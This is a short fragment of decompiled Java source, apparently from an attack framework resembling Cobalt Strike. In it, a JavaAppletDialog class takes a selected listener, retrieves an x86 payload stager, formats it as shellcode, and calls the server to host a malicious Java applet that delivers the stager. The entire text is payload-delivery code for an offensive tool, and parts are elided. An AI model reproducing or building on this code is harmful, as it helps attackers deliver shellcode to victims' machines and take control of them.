...
public abstract class JavaAppletDialog implements DialogListener, Callback {
   ...
   public void dialogAction(ActionEvent var1, Map var2) {
      ...
      ScListener var3 = ListenerUtils.getListener(this.client, this.lname);
      if (var3 == null) {
         this.dialog.setVisible(true);
         DialogUtils.showError("A listener was not selected");
      } else {
         byte[] var4 = CommonUtils.readResource(this.getResourceName());
         byte[] var5 = ListenerUtils.getListener(this.client, this.lname).getPayloadStager("x86");
         String var6 = this.formatShellcode(var5);
         this.client.getConnection().call("cloudstrike.host_applet", CommonUtils.args(this.host, Integer.parseInt(this.port), this.ssl, this.uri, var4, var6, this.getMainClass(), this.getShortDescription()), this);
      }
   }
